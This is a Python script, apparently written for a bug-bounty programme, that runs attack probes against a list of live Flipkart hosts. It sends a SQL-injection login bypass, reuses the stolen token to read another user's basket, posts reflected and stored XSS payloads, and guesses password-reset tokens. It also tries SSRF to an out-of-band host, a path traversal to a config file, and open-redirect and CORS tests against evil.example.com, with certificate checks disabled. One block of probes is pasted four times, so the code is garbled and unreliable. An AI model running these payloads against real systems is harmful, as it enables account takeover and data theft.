"""
Flipkart Live Probe Runner
Runs a minimal set of example probes (SQLi login, IDOR basket, reflected XSS, stored XSS, HSTS check)
against each in‑scope Flipkart asset.
Rate‑limited to 1 RPS per the program policy.
"""
import json, time, urllib.request, urllib.parse, ssl, sys, os

# Optional out‑of‑band URL for SSRF validation (set via env var or edit below)
SSRF_TARGET = os.getenv('SSRF_TARGET', '')

# Disable SSL verification for testing only – avoids certificate errors on many hosts
ssl_context = ssl._create_unverified_context()

from pathlib import Path

DATA_FILE = Path('f:/New folder/data/in_scope_assets.json')

def load_targets():
    data = json.loads(DATA_FILE.read_text(encoding='utf-8'))
    flip = data.get('flipkart', {})
    return flip.get('in_scope_assets', [])

def probe_host(host):
    base = f'https://{host}'
    print(f'\n=== Probing {host} ===')
    # 1. SQLi login (generic, may not exist)
    try:
        login_url = f"{base}/rest/user/login"
        payload = json.dumps({"email": "' OR 1=1--", "password": "password"}).encode('utf-8')
        req = urllib.request.Request(login_url, data=payload, headers={"Content-Type": "application/json"}, method='POST')
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            data = json.loads(resp.read().decode())
            token = data.get('authentication', {}).get('token', '')
            print('1. SQLi login succeeded, token acquired')
    except Exception as e:
        print('1. SQLi login failed:', e)
        token = ''
    time.sleep(1)
    # Advanced probes will be executed after the basic ones (see later in the script)
    # 7. Open‑redirect test (if endpoint exists)
    try:
        redirect_url = f"{base}/redirect?url=https://evil.example.com"
        req = urllib.request.Request(redirect_url, method='GET')
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            loc = resp.getheader('Location')
            if loc and 'evil.example.com' in loc:
                print("7. Open redirect vulnerable – Location:", loc)
            else:
                print("7. Open redirect not vulnerable or endpoint missing")
    except Exception as e:
        print("7. Open redirect check failed:", e)
    time.sleep(1)
    # 8. CORS mis‑configuration test (OPTIONS request)
    try:
        options_req = urllib.request.Request(base, method='OPTIONS')
        options_req.add_header('Origin', 'https://evil.example.com')
        with urllib.request.urlopen(options_req, timeout=5, context=ssl_context) as resp:
            allow_origin = resp.getheader('Access-Control-Allow-Origin')
            if allow_origin and allow_origin != 'null':
                print('8. CORS misconfiguration – ACAO:', allow_origin)
            else:
                print('8. CORS appears safe')
    except Exception as e:
        print('8. CORS test failed:', e)
    time.sleep(1)
    # 9. Password‑reset token enumeration (guessable token)
    try:
        # Simple token guess – many apps use numeric IDs
        for guess in range(1,4):
            token_url = f"{base}/password-reset?token={guess}"
            req = urllib.request.Request(token_url)
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
                body = resp.read().decode(errors='ignore')
                if 'invalid' not in body.lower():
                    print('9. Password‑reset token may be guessable – response for', guess)
                    break
        else:
            print('9. Password‑reset token enumeration did not find a valid token')
    except Exception as e:
        print('9. Password-reset token test failed:', e)
    time.sleep(1)
    # 10. SSRF proof‑of‑concept (out‑of‑band) – only if SSRF_TARGET supplied
    if SSRF_TARGET:
        try:
            ssrf_url = f"{base}/api/ssrf?url={urllib.parse.quote(SSRF_TARGET)}"
            req = urllib.request.Request(ssrf_url)
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
                print('10. SSRF request sent to', SSRF_TARGET)
        except Exception as e:
            print('10. SSRF test failed:', e)
    else:
        print('10. SSRF_TARGET not set – skipping SSRF test')
    time.sleep(1)
    # 11. Path‑traversal check (static file access)
    try:
        trav_url = f"{base}/static/../conf/app.yaml"
        req = urllib.request.Request(trav_url)
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            content = resp.read().decode(errors='ignore')
            if 'apiVersion' in content or ':' in content:
                print('11. Path traversal may be possible – content snippet:', content[:100])
            else:
                print('11. Path traversal returned but no obvious config')
    except Exception as e:
        print('11. Path traversal check failed:', e)
    time.sleep(1)
    # 2. IDOR basket (generic)
    try:
        basket_url = f"{base}/rest/basket/2"
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        req = urllib.request.Request(basket_url, headers=headers)
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            data = json.loads(resp.read().decode())
            print('2. IDOR basket succeeded, data keys:', list(data.keys()))
    except Exception as e:
        print('2. IDOR basket failed:', e)
    time.sleep(1)
    # Advanced probes will be executed after the basic ones (see later in the script)
    # 7. Open‑redirect test (if endpoint exists)
    try:
        redirect_url = f"{base}/redirect?url=https://evil.example.com"
        req = urllib.request.Request(redirect_url, method='GET')
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            loc = resp.getheader('Location')
            if loc and 'evil.example.com' in loc:
                print("7. Open redirect vulnerable – Location:", loc)
            else:
                print("7. Open redirect not vulnerable or endpoint missing")
    except Exception as e:
        print("7. Open redirect check failed:", e)
    time.sleep(1)
    # 8. CORS mis‑configuration test (OPTIONS request)
    try:
        options_req = urllib.request.Request(base, method='OPTIONS')
        options_req.add_header('Origin', 'https://evil.example.com')
        with urllib.request.urlopen(options_req, timeout=5, context=ssl_context) as resp:
            allow_origin = resp.getheader('Access-Control-Allow-Origin')
            if allow_origin and allow_origin != 'null':
                print('8. CORS misconfiguration – ACAO:', allow_origin)
            else:
                print('8. CORS appears safe')
    except Exception as e:
        print('8. CORS test failed:', e)
    time.sleep(1)
    # 9. Password‑reset token enumeration (guessable token)
    try:
        # Simple token guess – many apps use numeric IDs
        for guess in range(1,4):
            token_url = f"{base}/password-reset?token={guess}"
            req = urllib.request.Request(token_url)
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
                body = resp.read().decode(errors='ignore')
                if 'invalid' not in body.lower():
                    print('9. Password‑reset token may be guessable – response for', guess)
                    break
        else:
            print('9. Password‑reset token enumeration did not find a valid token')
    except Exception as e:
        print('9. Password-reset token test failed:', e)
    time.sleep(1)
    # 10. SSRF proof‑of‑concept (out‑of‑band) – only if SSRF_TARGET supplied
    if SSRF_TARGET:
        try:
            ssrf_url = f"{base}/api/ssrf?url={urllib.parse.quote(SSRF_TARGET)}"
            req = urllib.request.Request(ssrf_url)
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
                print('10. SSRF request sent to', SSRF_TARGET)
        except Exception as e:
            print('10. SSRF test failed:', e)
    else:
        print('10. SSRF_TARGET not set – skipping SSRF test')
    time.sleep(1)
    # 11. Path‑traversal check (static file access)
    try:
        trav_url = f"{base}/static/../conf/app.yaml"
        req = urllib.request.Request(trav_url)
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            content = resp.read().decode(errors='ignore')
            if 'apiVersion' in content or ':' in content:
                print('11. Path traversal may be possible – content snippet:', content[:100])
            else:
                print('11. Path traversal returned but no obvious config')
    except Exception as e:
        print('11. Path traversal check failed:', e)
    time.sleep(1)
    # 3. Reflected XSS (search)
    try:
        search_url = f"{base}/rest/products/search?q=%3Ciframe%20src%3Djavascript:alert(1)%3E"
        req = urllib.request.Request(search_url)
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            data = json.loads(resp.read().decode())
            print('3. Reflected XSS query succeeded, items:', len(data.get('data', [])))
    except Exception as e:
        print('3. Reflected XSS query failed:', e)
    time.sleep(1)
    # Advanced probes will be executed after the basic ones (see later in the script)
    # 7. Open‑redirect test (if endpoint exists)
    try:
        redirect_url = f"{base}/redirect?url=https://evil.example.com"
        req = urllib.request.Request(redirect_url, method='GET')
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            loc = resp.getheader('Location')
            if loc and 'evil.example.com' in loc:
                print("7. Open redirect vulnerable – Location:", loc)
            else:
                print("7. Open redirect not vulnerable or endpoint missing")
    except Exception as e:
        print("7. Open redirect check failed:", e)
    time.sleep(1)
    # 8. CORS mis‑configuration test (OPTIONS request)
    try:
        options_req = urllib.request.Request(base, method='OPTIONS')
        options_req.add_header('Origin', 'https://evil.example.com')
        with urllib.request.urlopen(options_req, timeout=5, context=ssl_context) as resp:
            allow_origin = resp.getheader('Access-Control-Allow-Origin')
            if allow_origin and allow_origin != 'null':
                print('8. CORS misconfiguration – ACAO:', allow_origin)
            else:
                print('8. CORS appears safe')
    except Exception as e:
        print('8. CORS test failed:', e)
    time.sleep(1)
    # 9. Password‑reset token enumeration (guessable token)
    try:
        # Simple token guess – many apps use numeric IDs
        for guess in range(1,4):
            token_url = f"{base}/password-reset?token={guess}"
            req = urllib.request.Request(token_url)
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
                body = resp.read().decode(errors='ignore')
                if 'invalid' not in body.lower():
                    print('9. Password‑reset token may be guessable – response for', guess)
                    break
        else:
            print('9. Password‑reset token enumeration did not find a valid token')
    except Exception as e:
        print('9. Password-reset token test failed:', e)
    time.sleep(1)
    # 10. SSRF proof‑of‑concept (out‑of‑band) – only if SSRF_TARGET supplied
    if SSRF_TARGET:
        try:
            ssrf_url = f"{base}/api/ssrf?url={urllib.parse.quote(SSRF_TARGET)}"
            req = urllib.request.Request(ssrf_url)
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
                print('10. SSRF request sent to', SSRF_TARGET)
        except Exception as e:
            print('10. SSRF test failed:', e)
    else:
        print('10. SSRF_TARGET not set – skipping SSRF test')
    time.sleep(1)
    # 11. Path‑traversal check (static file access)
    try:
        trav_url = f"{base}/static/../conf/app.yaml"
        req = urllib.request.Request(trav_url)
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            content = resp.read().decode(errors='ignore')
            if 'apiVersion' in content or ':' in content:
                print('11. Path traversal may be possible – content snippet:', content[:100])
            else:
                print('11. Path traversal returned but no obvious config')
    except Exception as e:
        print('11. Path traversal check failed:', e)
    time.sleep(1)
    # 4. Stored XSS (feedback)
    try:
        fb_url = f"{base}/api/Feedbacks/"
        fb_payload = json.dumps({"comment": "<iframe src=\"javascript:alert(1)\"></iframe>", "rating":5}).encode('utf-8')
        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"} if token else {"Content-Type": "application/json"}
        req = urllib.request.Request(fb_url, data=fb_payload, headers=headers, method='POST')
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            print('4. Stored XSS feedback succeeded, status', resp.getcode())
    except Exception as e:
        print('4. Stored XSS feedback failed:', e)
    time.sleep(1)
    # Advanced probes will be executed after the basic ones (see later in the script)
    # 7. Open‑redirect test (if endpoint exists)
    try:
        redirect_url = f"{base}/redirect?url=https://evil.example.com"
        req = urllib.request.Request(redirect_url, method='GET')
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            loc = resp.getheader('Location')
            if loc and 'evil.example.com' in loc:
                print("7. Open redirect vulnerable – Location:", loc)
            else:
                print("7. Open redirect not vulnerable or endpoint missing")
    except Exception as e:
        print("7. Open redirect check failed:", e)
    time.sleep(1)
    # 8. CORS mis‑configuration test (OPTIONS request)
    try:
        options_req = urllib.request.Request(base, method='OPTIONS')
        options_req.add_header('Origin', 'https://evil.example.com')
        with urllib.request.urlopen(options_req, timeout=5, context=ssl_context) as resp:
            allow_origin = resp.getheader('Access-Control-Allow-Origin')
            if allow_origin and allow_origin != 'null':
                print('8. CORS misconfiguration – ACAO:', allow_origin)
            else:
                print('8. CORS appears safe')
    except Exception as e:
        print('8. CORS test failed:', e)
    time.sleep(1)
    # 9. Password‑reset token enumeration (guessable token)
    try:
        # Simple token guess – many apps use numeric IDs
        for guess in range(1,4):
            token_url = f"{base}/password-reset?token={guess}"
            req = urllib.request.Request(token_url)
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
                body = resp.read().decode(errors='ignore')
                if 'invalid' not in body.lower():
                    print('9. Password‑reset token may be guessable – response for', guess)
                    break
        else:
            print('9. Password‑reset token enumeration did not find a valid token')
    except Exception as e:
        print('9. Password-reset token test failed:', e)
    time.sleep(1)
    # 10. SSRF proof‑of‑concept (out‑of‑band) – only if SSRF_TARGET supplied
    if SSRF_TARGET:
        try:
            ssrf_url = f"{base}/api/ssrf?url={urllib.parse.quote(SSRF_TARGET)}"
            req = urllib.request.Request(ssrf_url)
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
                print('10. SSRF request sent to', SSRF_TARGET)
        except Exception as e:
            print('10. SSRF test failed:', e)
    else:
        print('10. SSRF_TARGET not set – skipping SSRF test')
    time.sleep(1)
    # 11. Path‑traversal check (static file access)
    try:
        trav_url = f"{base}/static/../conf/app.yaml"
        req = urllib.request.Request(trav_url)
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            content = resp.read().decode(errors='ignore')
            if 'apiVersion' in content or ':' in content:
                print('11. Path traversal may be possible – content snippet:', content[:100])
            else:
                print('11. Path traversal returned but no obvious config')
    except Exception as e:
        print('11. Path traversal check failed:', e)
    time.sleep(1)
    # 5. HSTS header check
    try:
        static_url = f"{base}/assets/public/favicon_js.ico"
        req = urllib.request.Request(static_url)
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            hsts = any(k.lower() == 'strict-transport-security' for k in resp.headers.keys())
            print('5. Static asset HSTS header present?', hsts)
    except Exception as e:
        print('5. HSTS check failed:', e)
    time.sleep(1)
    # Advanced probes will be executed after the basic ones (see later in the script)
    # 7. Open‑redirect test (if endpoint exists)
    try:
        redirect_url = f"{base}/redirect?url=https://evil.example.com"
        req = urllib.request.Request(redirect_url, method='GET')
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            loc = resp.getheader('Location')
            if loc and 'evil.example.com' in loc:
                print("7. Open redirect vulnerable – Location:", loc)
            else:
                print("7. Open redirect not vulnerable or endpoint missing")
    except Exception as e:
        print("7. Open redirect check failed:", e)
    time.sleep(1)
    # 8. CORS mis‑configuration test (OPTIONS request)
    try:
        options_req = urllib.request.Request(base, method='OPTIONS')
        options_req.add_header('Origin', 'https://evil.example.com')
        with urllib.request.urlopen(options_req, timeout=5, context=ssl_context) as resp:
            allow_origin = resp.getheader('Access-Control-Allow-Origin')
            if allow_origin and allow_origin != 'null':
                print('8. CORS misconfiguration – ACAO:', allow_origin)
            else:
                print('8. CORS appears safe')
    except Exception as e:
        print('8. CORS test failed:', e)
    time.sleep(1)
    # 9. Password‑reset token enumeration (guessable token)
    try:
        # Simple token guess – many apps use numeric IDs
        for guess in range(1,4):
            token_url = f"{base}/password-reset?token={guess}"
            req = urllib.request.Request(token_url)
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
                body = resp.read().decode(errors='ignore')
                if 'invalid' not in body.lower():
                    print('9. Password‑reset token may be guessable – response for', guess)
                    break
        else:
            print('9. Password‑reset token enumeration did not find a valid token')
    except Exception as e:
        print('9. Password-reset token test failed:', e)
    time.sleep(1)
    # 10. SSRF proof‑of‑concept (out‑of‑band) – only if SSRF_TARGET supplied
    if SSRF_TARGET:
        try:
            ssrf_url = f"{base}/api/ssrf?url={urllib.parse.quote(SSRF_TARGET)}"
            req = urllib.request.Request(ssrf_url)
            with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
                print('10. SSRF request sent to', SSRF_TARGET)
        except Exception as e:
            print('10. SSRF test failed:', e)
    else:
        print('10. SSRF_TARGET not set – skipping SSRF test')
    time.sleep(1)
    # 11. Path‑traversal check (static file access)
    try:
        trav_url = f"{base}/static/../conf/app.yaml"
        req = urllib.request.Request(trav_url)
        with urllib.request.urlopen(req, timeout=5, context=ssl_context) as resp:
            content = resp.read().decode(errors='ignore')
            if 'apiVersion' in content or ':' in content:
                print('11. Path traversal may be possible – content snippet:', content[:100])
            else:
                print('11. Path traversal returned but no obvious config')
    except Exception as e:
        print('11. Path traversal check failed:', e)
    time.sleep(1)

def main():
    hosts = load_targets()
    for h in hosts:
        probe_host(h)

if __name__ == '__main__':
    main()
